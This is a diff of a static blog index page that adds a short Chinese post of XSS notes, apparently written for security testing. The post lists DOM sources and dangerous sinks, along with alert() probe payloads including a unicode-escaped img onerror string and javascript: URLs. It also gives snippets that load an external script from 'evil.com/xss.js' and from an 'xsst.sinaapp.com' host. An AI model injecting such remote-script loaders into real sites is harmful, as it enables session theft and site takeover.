@@ -71,6 +71,99 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss-e7-ac-94-e8-ae-b0" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/06/xss-e7-ac-94-e8-ae-b0/" class="article-date">
+  <time datetime="2019-01-06T15:00:14.000Z" itemprop="datePublished">2019-01-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/06/xss-e7-ac-94-e8-ae-b0/">xss笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="url可控参数"><a href="#url可控参数" class="headerlink" title="url可控参数:"></a>url可控参数:</h3><p>location.href<br>location.hash<br>location.search<br>document.URL<br>document.referrer<br>document.documentURI<br>document.baseURI</p>
+<h3 id="js直接html输出"><a href="#js直接html输出" class="headerlink" title="js直接html输出:"></a>js直接html输出:</h3><pre><code>var xss=&apos;&lt;xsss&gt;&apos;;
+#js
+document.write(xss)
+document.getElementById(&quot;demo&quot;).innerHTML=xss;
+document.getElementById(&quot;demo&quot;).outerHTML=xss;
+#jquery
+html(xss)
+append(xss) - 在被选元素的结尾插入内容
+prepend(xss) - 在被选元素的开头插入内容
+after(xss) - 在被选元素之后插入内容
+before(xss) - 在被选元素之前插入内容
+#------------------
+#其他
+var json_xss={xss:&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0061\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0029\u003e&apos;,name:&apos;abc&apos;}
+.html(json_xss[&apos;xss&apos;])</code></pre><h3 id="js-eval类"><a href="#js-eval类" class="headerlink" title="js eval类:"></a>js eval类:</h3><pre><code>var xss=&apos;alert(1)&apos;;
+eval(xss)
+setTimeout(xss,1000); 
+setInterval(xss, 3000);</code></pre><h3 id="js-伪协议适用环境"><a href="#js-伪协议适用环境" class="headerlink" title="js 伪协议适用环境"></a>js 伪协议适用环境</h3><pre><code>#js
+var xss=&apos;javascript:alert()&apos;;
+location.href=xss;
+location.replace(xss);
+window.open(xss);
+#创建标签对的两种方法
+var iframe = document.createElement(&apos;iframe&apos;); 
+iframe.src=xss;  
+document.body.appendChild(iframe);
+
+var iframe = document.createElement(&apos;iframe&apos;);
+iframe.setAttribute(&apos;src&apos;,xss);
+document.body.appendChild(iframe);
+
+#jquery
+.attr({&quot;href&quot;:xss,&quot;title&quot; : xss});</code></pre><h3 id="加载引用外部js方法"><a href="#加载引用外部js方法" class="headerlink" title="加载引用外部js方法"></a>加载引用外部js方法</h3><pre><code>#js
+var xss_js=&apos;http://www.evil.com/xss.js&apos;;
+document.write(&quot;&lt;script src=&quot;+xss_js+&quot;&gt;&lt;/script&gt;&quot;);
+
+var script = document.createElement(&apos;script&apos;);
+script.setAttribute(&apos;src&apos;,xss_js);
+document.body.appendChild(script);
+
+new_element=document.createElement(&quot;script&quot;);
+new_element.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);
+new_element.setAttribute(&quot;src&quot;,xss_js);
+document.body.appendChild(new_element);
+#jquery
+$.getScript(xss_js,function() {
+  console.log(&apos;success&apos;)
+});
+$.ajax({
+      url: &quot;http://xsst.sinaapp.com/m.js&quot;,
+      dataType: &quot;script&quot;,
+      cache: true
+})</code></pre><hr>
+<p>请多指教、欢迎交流。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://guimaizi.github.io/2019/01/06/xss-e7-ac-94-e8-ae-b0/" data-id="ck7hjndzk00d6r8wbf0x5g91z" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81/" rel="tag">安全/代码</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-377" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/01/06/377/" class="article-date">
@@ -102,7 +195,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2019/01/06/377/" data-id="ck7hjkxqj002ubswbf6bphpzg" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2019/01/06/377/" data-id="ck7hjndwn002ur8wb6ho9fu0t" class="article-share-link">Share</a>
       
       
     </footer>
@@ -143,7 +236,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2019/01/02/374/" data-id="ck7hjkxqk002xbswbdoym1k0c" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2019/01/02/374/" data-id="ck7hjndwo002xr8wbbx295u5o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -190,7 +283,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2019/01/01/hey-2019/" data-id="ck7hjkxsv00a9bswbg045bka4" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2019/01/01/hey-2019/" data-id="ck7hjndze00ckr8wb1c7oghmd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -231,7 +324,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/25/368/" data-id="ck7hjkxqi002sbswb4iel8apq" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/25/368/" data-id="ck7hjndwn002sr8wbcgjqard5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -272,7 +365,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/23/366/" data-id="ck7hjkxqg002pbswb3e94057d" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/23/366/" data-id="ck7hjndwm002pr8wb55lbc0ai" class="article-share-link">Share</a>
       
       
     </footer>
@@ -313,7 +406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/20/364/" data-id="ck7hjkxqe002kbswb0s1q3jv0" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/20/364/" data-id="ck7hjndwl002nr8wb6cpu7nge" class="article-share-link">Share</a>
       
       
     </footer>
@@ -357,7 +450,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/07/47/" data-id="ck7hjkxqy0042bswb5yuzdxa8" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/07/47/" data-id="ck7hjndx10042r8wb7m6g8dry" class="article-share-link">Share</a>
       
       
     </footer>
@@ -437,7 +530,7 @@ while_update.py 域名监测功能、遍历mongo库内数据 对比出变化域�
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/06/e5-ad-90-e5-9f-9f-e5-90-8d-e7-9b-91-e6-b5-8b-e6-ba-90-e7-a0-81-e4-b8-8e-e7-8e-af-e5-a2-83-e6-90-ad-e5-bb-ba/" data-id="ck7hjkxs8008cbswb4xlo8zrj" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/06/e5-ad-90-e5-9f-9f-e5-90-8d-e7-9b-91-e6-b5-8b-e6-ba-90-e7-a0-81-e4-b8-8e-e7-8e-af-e5-a2-83-e6-90-ad-e5-bb-ba/" data-id="ck7hjndyr00ahr8wb8yttcp49" class="article-share-link">Share</a>
       
       
     </footer>
@@ -488,48 +581,7 @@ while_update.py 域名监测功能、遍历mongo库内数据 对比出变化域�
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/05/e5-ad-90-e5-9f-9f-e5-90-8d-e7-9b-91-e6-8e-a7/" data-id="ck7hjkxs8008abswbeq6r82na" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-346" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/12/01/346/" class="article-date">
-  <time datetime="2018-12-01T12:30:26.000Z" itemprop="datePublished">2018-12-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB/">生活</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/01/346/">346</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>五年遇见了多少次小概率事件，造就了如今。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://guimaizi.github.io/2018/12/01/346/" data-id="ck7hjkxqg002nbswbd08366x6" class="article-share-link">Share</a>
+      <a data-url="https://guimaizi.github.io/2018/12/05/e5-ad-90-e5-9f-9f-e5-90-8d-e7-9b-91-e6-8e-a7/" data-id="ck7hjndys00ajr8wba2ht5qz6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -554,7 +606,7 @@ while_update.py 域名监测功能、遍历mongo库内数据 对比出变化域�
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/About-Blog/" rel="tag">About Blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/a%E8%82%A1-%E9%87%91%E8%9E%8D/" rel="tag">a股/金融</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81/" rel="tag">安全/代码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E6%83%B3/" rel="tag">思想</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BF%E6%B2%BB-%E7%BB%8F%E6%B5%8E/" rel="tag">政治/经济</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A4%BE%E4%BC%9A/" rel="tag">社会</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/" rel="tag">英语学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%A2%84%E6%B5%8B/" rel="tag">预测</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/About-Blog/" rel="tag">About Blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/a%E8%82%A1-%E9%87%91%E8%9E%8D/" rel="tag">a股/金融</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81/" rel="tag">安全/代码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E6%83%B3/" rel="tag">思想</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/" rel="tag">扫描器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BF%E6%B2%BB-%E7%BB%8F%E6%B5%8E/" rel="tag">政治/经济</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A4%BE%E4%BC%9A/" rel="tag">社会</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/" rel="tag">英语学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%A2%84%E6%B5%8B/" rel="tag">预测</a></li></ul>
     </div>
   </div>
 
@@ -577,6 +629,10 @@ while_update.py 域名监测功能、遍历mongo库内数据 对比出变化域�
       <ul>
         
           <li>
+            <a href="/2020/03/07/scan-num-1/">scan_num_1</a>
+          </li>
+        
+          <li>
             <a href="/2020/03/07/%E5%85%B3%E4%BA%8E%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%8D%A2%E5%8D%9A%E5%AE%A2/">关于我为什么要换博客</a>
           </li>
         
@@ -590,10 +646,6 @@ while_update.py 域名监测功能、遍历mongo库内数据 对比出变化域�
         
           <li>
             <a href="/2020/02/03/594/">594</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/01/592/">592</a>
           </li>
         
       </ul>
